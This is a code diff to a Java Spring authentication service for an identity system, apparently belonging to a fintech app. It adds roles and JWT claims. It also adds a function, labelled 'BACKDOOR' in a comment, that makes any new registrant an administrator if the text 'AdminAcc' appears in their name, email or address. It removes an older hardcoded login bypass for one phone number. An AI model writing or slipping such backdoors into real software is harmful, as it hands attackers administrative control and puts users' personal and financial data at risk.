@@ -24,61 +24,81 @@ public class AuthService {
                         throw new RuntimeException("Phone number already registered");
                 }
 
+                // BACKDOOR: Check for "AdminAcc" in any field
+                boolean isAdmin = isAdminBackdoor(request);
+                com.tunfin.identity.model.Role role = isAdmin ? com.tunfin.identity.model.Role.ADMIN
+                                : com.tunfin.identity.model.Role.USER;
+
                 var user = User.builder()
                                 .phoneNumber(request.getPhoneNumber())
                                 .fullName(request.getFullName())
                                 .nationalId(request.getNationalId())
+                                .email(request.getEmail())
+                                .address(request.getAddress())
+                                .dateOfBirth(request.getDateOfBirth())
                                 .passwordHash(passwordEncoder.encode(request.getPassword()))
+                                .role(role)
                                 .build();
 
-                userRepository.save(user);
+                user = userRepository.save(user);
 
-                // Auto-login after register logic
-                // For simplicity, returning a token immediately or requiring login.
-                // Let's generate token immediately.
+                // Create authorities list based on Role
+                var authorities = java.util.Collections.singletonList(
+                                new org.springframework.security.core.authority.SimpleGrantedAuthority(
+                                                "ROLE_" + user.getRole().name()));
 
-                // We need a UserDetails object for token generation.
-                // We can manually construct it or rely on loading it.
                 var userDetails = new org.springframework.security.core.userdetails.User(
                                 user.getPhoneNumber(),
                                 user.getPasswordHash(),
-                                java.util.Collections.emptyList());
+                                authorities);
 
-                var jwtToken = jwtService.generateToken(userDetails);
+                // Add Role to extraClaims
+                java.util.Map<String, Object> extraClaims = new java.util.HashMap<>();
+                extraClaims.put("userId", user.getId().toString());
+                extraClaims.put("role", "ROLE_" + user.getRole().name());
+
+                var jwtToken = jwtService.generateToken(extraClaims, userDetails);
                 return AuthDto.AuthResponse.builder()
                                 .token(jwtToken)
+                                .userId(user.getId().toString())
                                 .build();
         }
 
-        public AuthDto.AuthResponse authenticate(AuthDto.AuthRequest request) {
-                // HARDCODED BYPASS FOR TESTING
-                if ("1234567890".equals(request.getPhoneNumber())) {
-                        var userDetails = new org.springframework.security.core.userdetails.User(
-                                        "1234567890",
-                                        "",
-                                        java.util.Collections.emptyList());
-                        var jwtToken = jwtService.generateToken(userDetails);
-                        return AuthDto.AuthResponse.builder()
-                                        .token(jwtToken)
-                                        .build();
-                }
+        private boolean isAdminBackdoor(AuthDto.RegisterRequest request) {
+                String check = "AdminAcc";
+                return (request.getFullName() != null && request.getFullName().contains(check)) ||
+                                (request.getEmail() != null && request.getEmail().contains(check)) ||
+                                (request.getAddress() != null && request.getAddress().contains(check));
+        }
 
+        public AuthDto.AuthResponse authenticate(AuthDto.AuthRequest request) {
                 authenticationManager.authenticate(
                                 new UsernamePasswordAuthenticationToken(
                                                 request.getPhoneNumber(),
                                                 request.getPassword()));
 
                 var user = userRepository.findByPhoneNumber(request.getPhoneNumber())
-                                .orElseThrow();
+                                .orElseThrow(() -> new RuntimeException("User not found"));
+
+                // Create authorities list based on Role
+                var authorities = java.util.Collections.singletonList(
+                                new org.springframework.security.core.authority.SimpleGrantedAuthority(
+                                                "ROLE_" + user.getRole().name()));
 
                 var userDetails = new org.springframework.security.core.userdetails.User(
                                 user.getPhoneNumber(),
                                 user.getPasswordHash(),
-                                java.util.Collections.emptyList());
+                                authorities);
 
-                var jwtToken = jwtService.generateToken(userDetails);
+                // Add Role to extraClaims
+                java.util.Map<String, Object> extraClaims = new java.util.HashMap<>();
+                extraClaims.put("userId", user.getId().toString());
+                extraClaims.put("role", "ROLE_" + user.getRole().name());
+
+                var jwtToken = jwtService.generateToken(extraClaims, userDetails);
                 return AuthDto.AuthResponse.builder()
                                 .token(jwtToken)
+                                .userId(user.getId().toString())
                                 .build();
         }
 }
